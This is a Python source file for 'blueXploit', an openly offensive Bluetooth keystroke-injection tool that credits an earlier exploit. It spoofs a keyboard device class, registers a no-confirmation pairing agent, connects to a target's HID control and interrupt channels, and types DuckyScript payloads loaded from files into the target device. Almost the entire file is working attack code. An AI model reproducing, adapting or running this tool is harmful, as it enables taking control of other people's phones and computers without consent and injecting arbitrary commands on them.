#
#
#            *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *
#                           __    __          _  __       __      _ __
#                          / /_  / /_  _____ | |/ /____  / /___  (_) /_
#                         / __ \/ / / / / _ \|   // __ \/ / __ \/ / __/
#                        / /_/ / / /_/ /  __/   |/ /_/ / / /_/ / / /_
#                       /_.___/_/\__,_/\___/_/|_/ .___/_/\____/_/\__/
#                                              /_/
#
#
#                                    Developed by [Danyw24]
#                                 [https://github.com/Danyw24]
#                                    Original Exploit in
#                      [https://github.com/marcnewlin/hi_my_name_is_keyboard]
#
#
#
#
#
#
#
#

import argparse
import re
import time
import subprocess
import os
import sys
from multiprocessing import Process
import dbus
import dbus.service
import dbus.mainloop.glib
from gi.repository import GLib
from pydbus import SystemBus
from enum import Enum
import binascii
import bluetooth
from threading import Thread

from injector.hid import keyboard_report, ascii_to_hid
from injector.hid import Key, Mod
from injector.menu_functions import print_fancy_ascii_art



class ConnectionFailureException(Exception):
    pass


# Key codes for modifier keys
class Modifier_Codes(Enum):
    CTRL = 0x01
    RIGHTCTRL = 0x10

    SHIFT = 0x02
    RIGHTSHIFT = 0x20

    ALT = 0x04
    RIGHTALT = 0x40

    GUI = 0x08
    WINDOWS = 0x08
    COMMAND = 0x08
    RIGHTGUI = 0x80



class Key_Codes(Enum):
    NONE = 0x00
    a = 0x04
    b = 0x05
    c = 0x06
    d = 0x07
    e = 0x08
    f = 0x09
    g = 0x0a
    h = 0x0b
    i = 0x0c
    j = 0x0d
    k = 0x0e
    l = 0x0f
    m = 0x10
    n = 0x11
    o = 0x12
    p = 0x13
    q = 0x14
    r = 0x15
    s = 0x16
    t = 0x17
    u = 0x18
    v = 0x19
    w = 0x1a
    x = 0x1b
    y = 0x1c
    z = 0x1d
    _1 = 0x1e
    _2 = 0x1f
    _3 = 0x20
    _4 = 0x21
    _5 = 0x22
    _6 = 0x23
    _7 = 0x24
    _8 = 0x25
    _9 = 0x26
    _0 = 0x27
    ENTER = 0x28
    ESCAPE = 0x29
    BACKSPACE = 0x2a
    TAB = 0x2b
    SPACE = 0x2c
    MINUS = 0x2d
    EQUAL = 0x2e
    LEFTBRACE = 0x2f
    RIGHTBRACE = 0x30
    CAPSLOCK = 0x39
    VOLUME_UP = 0x80
    VOLUME_DOWN = 0x81
    SEMICOLON = 0x33
    COMMA = 0x36
    PERIOD = 0x37
    SLASH = 0x56 # ES KEYBOARD 0x36 //   0x38
    PIPE = 0x64 # AMBIGUO, CORREGIR
    BACKSLASH = 0x31
    GRAVE = 0x35
    APOSTROPHE = 0x34
    LEFT_BRACKET = 0x2f
    RIGHT_BRACKET = 0x30
    DOT = 0x37
    RIGHT = 0x4f
    LEFT = 0x50
    DOWN = 0x51
    UP = 0x52


    # SHIFT KEY MAPPING
    EXCLAMATION_MARK = 0x1e
    AT_SYMBOL = 0x1f
    HASHTAG = 0x20
    DOLLAR = 0x21
    PERCENT_SYMBOL = 0x22
    CARET_SYMBOL = 0x23
    AMPERSAND_SYMBOL = 0x24
    ASTERISK_SYMBOL = 0x25
    OPEN_PARENTHESIS = 0x26
    CLOSE_PARENTHESIS = 0x27
    UNDERSCORE_SYMBOL = 0x2d
    QUOTE = 0x34
    QUESTIONMARK = 0x38
    KEYPADPLUS = 0x57



class ReconnectionRequiredException(Exception):
    def __init__(self, message, current_line=0, current_position=0):
        super().__init__(message)
        time.sleep(2)
        self.current_line = current_line
        self.current_position = current_position



class Adapter:
  def __init__(self, iface):
    self.iface = iface
    self.bus = SystemBus()
    try:
      self.adapter = self.bus.get("org.bluez", "/org/bluez/%s" % iface)
    except KeyError:
      log.error("Adaptador '%s' no encontrado, saliendo." % iface)
      sys.exit(1)
    self.reset()


  def enable_ssp(self):
    run(["sudo", "btmgmt", "--index", self.iface, "io-cap", "1"])
    run(["sudo", "btmgmt", "--index", self.iface, "ssp", "1"])


  def disable_ssp(self):
    run(["sudo", "btmgmt", "--index", self.iface, "ssp", "0"])


  def set_name(self, name):
    if self.adapter.Name != name:
      run(["sudo", "hciconfig", self.iface, "name", name])
      if name not in run(["hciconfig", self.iface, "name"]).decode():
        log.error("Unable to set adapter name, aborting.")
        sys.exit(1)


  def set_class(self, adapter_class):
    class_hex = "0x%06x" % adapter_class
    if self.adapter.Class != class_hex:
      run(["sudo", "hciconfig", self.iface, "class", class_hex])
      if class_hex not in run(["hciconfig", self.iface, "class"]).decode():
        log.error("Unable to set adapter class, aborting.")
        sys.exit(1)


  def set_address(self, address):
    run(["sudo", "bdaddr", "-i", self.iface, address])
    self.reset()
    if address.upper() not in run(["hciconfig", self.iface]).decode():
      log.error("Unable to set adapter address, aborting.")
      sys.exit(1)


  def down(self):
    self.adapter.Powered = False


  def up(self):
    self.adapter.Powered = True


  def reset(self):
    self.down()
    self.up()



class Profile(dbus.service.Object):
  @dbus.service.method("org.bluez.Profile1", in_signature="", out_signature="")
  def Cancel(self):
    print("Profile.Cancel")



class Agent(dbus.service.Object):
  @dbus.service.method("org.bluez.Agent1", in_signature="", out_signature="")
  def Cancel(self):
    print("Agent.Cancel")


class Log:
  def status(self, msg):
    print("\033[0;96m[~]\033[0m %s" % msg)
  def success(self, msg):
    print("\033[0;92m[+]\033[0m %s" % msg)
  def error(self, msg):
    print("\033[0;91m[!]\033[0m %s" % msg)
  def debug(self, msg):
    print("\033[0;37m[.]\033[0m %s" % msg)
  def notice(self, msg):
    print("\033[0;93m[?]\033[0m %s" % msg)
  def info(self, msg):
    print("\033[0;94m[*]\033[0m %s" % msg)
  def enum(self, index, msg):
    print("\033[0;94m<\033[0m%s\033[0;94m>\033[0m %s" % (index, msg))
  def warning(self, msg):
    print("\033[0;93m[!]\033[0m %s" % msg)


log = Log()


class PayloadManager:
  def __init__(self, payload_directory):
    self.payloads = []
    self.payload_name = []
    self.payload_directory = payload_directory
    self.payload_selected = 0


  def load_payloads(self):
    log.info("Cargando Payloads")
    for dirpath, dirnames, filenames in os.walk(self.payload_directory):
      for filename in filenames:
        if filename.endswith(".txt"):
          self.payloads.append(os.path.join(dirpath, filename))
          self.payload_name.append(filename)
    if self.payloads:
      log.success("Payloads cargados")
    else:
      log.error("Payloads no encontrados en %s" % self.payload_directory)


  def payload_select (self):
    for index, payload in enumerate(self.payloads):
      log.enum(index, self.payload_name[index])
    log.info("Selecciona un Payload: ")
    self.payload_selected = int(input("> "))
    if not self.selection_check(self.payload_selected):
      log.error("Error: Payload no encontrado")
      sys.exit(1)
    log.info("Payload: %s" % self.payload_name[self.payload_selected])


  def read_payload(self,payload_script_path):
    if os.path.exists(payload_script_path):
        with open(payload_script_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    else:
        log.warning(f"File {filename} not found. Skipping DuckyScript.")
        return None


  def selection_check(self, selection):
    return isinstance(selection, int) and 0 <= selection < len(self.payloads)


  def get_payload(self):
    path = self.payload_directory + self.payload_name[self.payload_selected]
    data = (path, self.payload_selected)
    return data



class PairingAgent:
  def __init__(self, iface, target_addr):
    self.iface = iface
    self.target_addr = target_addr
    dev_name = "dev_%s" % target_addr.upper().replace(":", "_")
    self.target_path = "/org/bluez/%s/%s" % (iface, dev_name)

  def __enter__(self):
    self.agent = Process(target=agent_loop, args=(self.target_path,))
    self.agent.start()
    time.sleep(0.25)

  def __exit__(self, a, b, c):
    self.agent.kill()
    time.sleep(0.25)



class L2CAPConnectionManager:
    def __init__(self, target_address):
        self.target_address = target_address
        self.clients = {}

    def create_connection(self, port):
        client = L2CAPClient(self.target_address, port)
        self.clients[port] = client
        return client

    def connect_all(self):
        try:
            return sum(client.connect() for client in self.clients.values())
        except ConnectionFailureException as e:
            log.error(f"Connection failure: {e}")
            raise

    def close_all(self):
        for client in self.clients.values():
            client.close()





class L2CAPClient:

    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.connected = False
        self.sock = None


    def encode_keyboard_input(*args):
      keycodes = []
      flags = 0
      for a in args:
        if isinstance(a, Key_Codes):
          keycodes.append(a.value)
        elif isinstance(a, Modifier_Codes):
          flags |= a.value
      assert(len(keycodes) <= 7)
      keycodes += [0] * (7 - len(keycodes))
      report = bytes([0xa1, 0x01, flags, 0x00] + keycodes)
      return report


    def close(self):
        if self.connected:
            self.sock.close()
        self.connected = False
        self.sock = None


    def reconnect(self):
        # Notify the main script or trigger a reconnection process
        raise ReconnectionRequiredException("Reconnection required")


    def send(self, data):
        if not self.connected:
            log.error("[TX] Not connected")
            self.reconnect()

        log.debug(f"[TX-{self.port}] Attempting to send data: {binascii.hexlify(data).decode()}")
        try:
            self.attempt_send(data)
            log.debug(f"[TX-{self.port}] Data sent successfully")
        except bluetooth.btcommon.BluetoothError as ex:
            log.error(f"[TX-{self.port}] Bluetooth error: {ex}")
            self.reconnect()
            self.send(data)  # Retry sending after reconnection
        except Exception as ex:
            log.error(f"[TX-{self.port}] Exception: {ex}")
            raise


    def attempt_send(self, data, timeout=0.5):
        start = time.time()
        while time.time() - start < timeout:
            try:
                self.sock.send(data)
                return
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:  # no data available
                    raise
                time.sleep(0.001)


    def recv(self, timeout=0):
        start = time.time()
        while True:
            raw = None
            if not self.connected:
                return None
            if self.sock is None:
                return None
            try:
                raw = self.sock.recv(64)
                if len(raw) == 0:
                    self.connected = False
                    return None
                log.debug(f"[RX-{self.port}] Received data: {binascii.hexlify(raw).decode()}")
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:  # no data available
                    raise ex
                else:
                    if (time.time() - start) < timeout:
                        continue
            return raw

    def connect(self, timeout=None):
        log.debug(f"Attempting to connect to {self.addr} on port {self.port}")
        log.info("connecting to %s on port %d" % (self.addr, self.port))
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(timeout)
        try:
            sock.connect((self.addr, self.port))
            sock.setblocking(0)
            self.sock = sock
            self.connected = True
            log.debug("SUCCESS! connected on port %d" % self.port)
        except Exception as ex:
            self.connected = False
            log.error("ERROR connecting on port %d: %s" % (self.port, ex))
            raise ConnectionFailureException(f"Connection failure on port {self.port}")

        return self.connected


    def send_keyboard_report(self, *args):
        self.send(self.encode_keyboard_input(*args))


    def send_keypress(self, *args, delay=0.0001):
        if args:
            log.debug(f"Attempting to send... {args}")
            self.send(self.encode_keyboard_input(*args))
            time.sleep(delay)
            # Envia reporte vacio
            self.send(self.encode_keyboard_input())
            time.sleep(delay)
        else:
            self.send(self.encode_keyboard_input())
        time.sleep(delay)
        return True


    def send_keyboard_combination(self, modifier, key, delay=0.004):
        # Press the combination
        press_report = self.encode_keyboard_input(modifier, key)
        self.send(press_report)
        time.sleep(delay)  # Delay to simulate key press

        # Release the combination
        release_report = self.encode_keyboard_input()
        self.send(release_report)
        time.sleep(delay)



# helper functions

def parse_arguments():
    parser = argparse.ArgumentParser("keystroke-injection-android-linux.py")
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("-t", "--target_address", required=True)
    return parser.parse_args()


def verify_address(args):
  if not re.match(r"^([a-fA-F0-9]{2}:{0,1}){5}[a-fA-F0-9]{2}$", args.target_address):
      log.error("Error: Ingresa una dirección correcta: '%s'" % args.target_address)
      sys.exit(1)



def run(command):
  assert(isinstance(command, list))
  log.debug("Ejecutando:  '%s'" % " ".join(command))
  return subprocess.check_output(command, stderr=subprocess.PIPE)

# Main

def Main():
     # Initializing Log
    print_fancy_ascii_art()
    args = parse_arguments()

    payload_manager = PayloadManager("./injector/payloads/")
    payload_manager.load_payloads()
    payload_manager.payload_select()
    # path, payload_selected
    payload_data = payload_manager.get_payload()
    payload_script = payload_manager.read_payload(payload_data[0])

    verify_address(args)
    assert(re.match(r"^hci\d+$", args.interface))

    # Restarting Services
    run(["sudo", "service", "bluetooth", "restart"])
    time.sleep(0.5)


    #register a hide profile
    profile_proc = Process(target=register_hid_profile, args=(args.interface, args.target_address))
    profile_proc.start()


    # configure name and class
    log.status("Configurando la interfaz: '%s'" % args.interface )
    adapter = Adapter(args.interface)
    adapter.set_name("blueXploit")
    adapter.set_class(0x002540) # 0x00 sin especificar 0x25 HID device 0x40 Keyboard or mouse
    target_name = run(["hcitool", "name", args.target_address]) #Gets name
    adapter.enable_ssp()
    time.sleep(2)
    client = L2CAPConnectionManager(args.target_address)
    log.info("Target name: %s" % target_name.decode('utf-8'))



    while True:

      try:
        with PairingAgent(adapter.iface, args.target_address):

            # attempt to connect to HID Control and HID Interrupt on the target
            client.create_connection(1) # canal 19
            client.create_connection(17) # canal 17
            client.create_connection(19)
            # wait up to 1 second for one of the services to disconnect
            start = time.time()
            if not client.connect_all():
              raise ConnectionFailureException("Failed to connect to all required ports")

        log.success("Iniciando inyeccion de payload: %s" % payload_data[1])
        process_duckyscript(client.clients[19], payload_script)
        time.sleep(2)
        log.success("Payload ejecutado, Descontectando Bluetooth HID client")
        sys.exit(1)
        break
      except ReconnectionRequiredException as e:
        log.info("Reconexion requerida. Reconectando")
        client.close()
        adapter.down()
        profile_proc.terminate()



def process_duckyscript(client, duckyscript, current_line=0, current_position=0):
    client.send_keypress('')
    time.sleep(0.5)

    shift_required_characters = "!@#$%^&*()_+{}|:\"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    try:
        for line_number, line in enumerate(duckyscript):
            if line_number < current_line:
                continue  # Skip already processed lines

            if line_number == current_line and current_position > 0:
                line = line[current_position:]  # Resume from the last position within the current line
            else:
                current_position = 0  # Reset position for new line

            line = line.strip() # quitar espacios en blanco y limpia texto
            log.info(f"Procesando: {line}")

            if not line or line.startswith("REM"):
                continue

            if line.startswith("TAB"):
                client.send_keypress(Key_Codes.TAB)

            if line.startswith("PRIVATE_BROWSER"):
                report = bytes([0xa1, 0x01, Modifier_Codes.CTRL.value | Modifier_Codes.SHIFT.value, 0x00, Key_Codes.n.value, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                client.send(report)
                # Don't forget to send a release report afterwards
                release_report = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                client.send(release_report)

            #Delay
            if line.startswith("DELAY"):
                try:
                    delay_time = int(line.split()[1])
                    time.sleep(delay_time / 1000)  # millis

                except ValueError:
                    log.error(f"Invalid DELAY format in line: {line}")
                except IndexError:
                    log.error(f"DELAY command requires a time parameter in line: {line}")
                continue  # sigue con el flujo despues del Delay

            if line.startswith("STRING"):
                text = line[7:] # Extrae el texto
                for char_position, char in enumerate(text, start=1):
                    log.notice(f"Attempting to send letter: {char}")
                    # Procesa cada caracter

                    try:
                        if char.isdigit():
                            key_code = getattr(Key_Codes, f"_{char}")
                            client.send_keypress(key_code)

                        elif char == " ":
                            client.send_keypress(Key_Codes.SPACE)

                        elif char == "[":
                            client.send_keypress(Key_Codes.LEFTBRACE)
                        elif char == "]":
                            client.send_keypress(Key_Codes.RIGHTBRACE)
                        elif char == ";":
                            client.send_keypress(Key_Codes.SEMICOLON)
                        elif char == "'":
                            client.send_keypress(Key_Codes.QUOTE)
                        elif char == "/":
                            client.send_keypress(Key_Codes.SLASH)
                        elif char == ".":
                            client.send_keypress(Key_Codes.DOT)
                        elif char == ",":
                            client.send_keypress(Key_Codes.COMMA)
                        elif char == "|":
                            client.send_keypress(Key_Codes.PIPE)
                        elif char == "-":
                            client.send_keypress(Key_Codes.MINUS)
                        elif char == "=":
                            client.send_keypress(Key_Codes.EQUAL)
                        elif char in shift_required_characters:
                            key_code_str = char_to_key_code(char)
                            if key_code_str:
                                key_code = getattr(Key_Codes, key_code_str)
                                client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                            else:
                                log.warning(f"Unsupported character '{char}' in Duckyscript")
                        elif char.isalpha():
                            key_code = getattr(Key_Codes, char.lower())
                            if char.isupper():
                                client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                            else:
                                client.send_keypress(key_code)
                        else:
                            key_code = char_to_key_code(char)
                            if key_code:
                                client.send_keypress(key_code)
                            else:
                                log.warning(f"Unsupported character '{char}' in Duckyscript")

                        current_position = char_position

                    except AttributeError as e:
                        log.warning(f"Attribute error: {e} - Unsupported character '{char}' in Duckyscript")

            elif any(mod in line for mod in ["SHIFT", "ALT", "CTRL", "GUI", "COMMAND", "WINDOWS"]):
                # Process modifier key combinations
                components = line.split()
                if len(components) == 2:
                    modifier, key = components
                    try:
                        # Convert to appropriate enums
                        modifier_enum = getattr(Modifier_Codes, modifier.upper())
                        key_enum = getattr(Key_Codes, key.lower())
                        client.send_keyboard_combination(modifier_enum, key_enum)
                        log.notice(f"Sent combination: {line}")

                    except AttributeError:
                        log.warning(f"Unsupported combination: {line}")
                else:
                    log.warning(f"Invalid combination format: {line}")
            elif line.startswith("ENTER"):
                client.send_keypress(Key_Codes.ENTER)
            # After processing each line, reset current_position to 0 and increment current_line
            current_position = 0
            current_line += 1

    except ReconnectionRequiredException:
        raise ReconnectionRequiredException("Reconnection required", current_line, current_position)

    except Exception as e:
        log.error(f"Error during script execution: {e}")



def char_to_key_code(char):

    # Mapping for special characters that always require SHIFT

    shift_char_map = {
        '!': 'EXCLAMATION_MARK',
        '@': 'AT_SYMBOL',
        '#': 'HASHTAG',
        '$': 'DOLLAR',
        '%': 'PERCENT_SYMBOL',
        '^': 'CARET_SYMBOL',
        '&': 'AMPERSAND_SYMBOL',
        '*': 'ASTERISK_SYMBOL',
        '(': 'OPEN_PARENTHESIS',
        ')': 'CLOSE_PARENTHESIS',
        '_': 'UNDERSCORE_SYMBOL',
        '+': 'KEYPADPLUS',
	    '{': 'LEFTBRACE',
	    '}': 'RIGHTBRACE',
	    ':': 'SEMICOLON',
	    '\\': 'BACKSLASH',
	    '"': 'QUOTE',
        '<': 'COMMA',
        '>': 'DOT',
	    '?': 'QUESTIONMARK',
	    'A': 'a',
	    'B': 'b',
	    'C': 'c',
	    'D': 'd',
	    'E': 'e',
	    'F': 'f',
	    'G': 'g',
	    'H': 'h',
	    'I': 'i',
	    'J': 'j',
	    'K': 'k',
	    'L': 'l',
	    'M': 'm',
	    'N': 'n',
	    'O': 'o',
	    'P': 'p',
	    'Q': 'q',
	    'R': 'r',
	    'S': 's',
	    'T': 't',
	    'U': 'u',
	    'V': 'v',
	    'W': 'w',
	    'X': 'x',
	    'Y': 'y',
	    'Z': 'z',



    }
    return shift_char_map.get(char)



def register_hid_profile(iface, addr):
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()
    get_obj = lambda path, iface: dbus.Interface(bus.get_object("org.bluez", path), iface)
    addr_str = addr.replace(":", "_")
    path = "/org/bluez/%s/dev_%s" % (iface, addr_str)
    manager = get_obj("/org/bluez", "org.bluez.ProfileManager1")
    profile_path = "/test/profile"
    profile = Profile(bus, profile_path)
    hid_uuid = "00001124-0000-1000-8000-00805F9B34FB"
    with open("keyboard.xml", "r") as f:
      opts = { "ServiceRecord": f.read() }
    log.debug("calling RegisterProfile")
    manager.RegisterProfile(profile, hid_uuid, opts)
    loop = GLib.MainLoop()
    try:
      log.debug("running dbus loop")
      loop.run()
    except KeyboardInterrupt:
      log.debug("calling UnregisterProfile")
      manager.UnregisterProfile(profile)


def agent_loop(target_path):
  dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
  loop = GLib.MainLoop()
  bus = dbus.SystemBus()
  path = "/test/agent"
  agent = Agent(bus, path)
  agent.target_path = target_path
  obj = bus.get_object("org.bluez", "/org/bluez")
  manager = dbus.Interface(obj, "org.bluez.AgentManager1")
  manager.RegisterAgent(path, "NoInputNoOutput")
  manager.RequestDefaultAgent(path)
  print("'NoInputNoOutput' pairing-agent is running")
  loop.run()



if __name__ == "__main__":
  try:
      Main()
  except KeyboardInterrupt:
    log.info("Saliendo...")